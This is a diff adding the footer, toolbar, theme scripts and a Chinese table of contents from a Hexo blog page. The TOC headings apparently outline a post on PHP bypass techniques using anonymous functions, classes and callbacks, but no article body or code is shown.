+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a> | Theme <a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.3.1</a>
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0"><span class="nav-text">匿名函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#echo%E7%BB%95%E8%BF%87"><span class="nav-text">echo绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B9%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0%E4%B8%BA%E6%99%AE%E9%80%9A%E5%87%BD%E6%95%B0"><span class="nav-text">改匿名函数为普通函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B9%E5%8F%98%E9%87%8F%E4%B8%BA%E6%95%B0%E7%BB%84"><span class="nav-text">改变量为数组</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E4%B8%80%E4%B8%8B"><span class="nav-text">验证一下</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B7%B1%E5%85%A5%E7%BB%95%E8%BF%87"><span class="nav-text">深入绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0"><span class="nav-text">直接调用匿名函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B1%BB%E7%BB%95%E8%BF%87"><span class="nav-text">类绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B1%BB%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-text">类的方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B5%8B%E5%80%BC%E7%BB%99%E5%8F%98%E9%87%8F"><span class="nav-text">赋值给变量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-text">利用魔术方法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0"><span class="nav-text">回调函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#call-user-func"><span class="nav-text">call_user_func</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E7%BB%84%E8%B5%8B%E5%80%BC"><span class="nav-text">数组赋值</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B%EF%BC%9A"><span class="nav-text">总结一下：</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
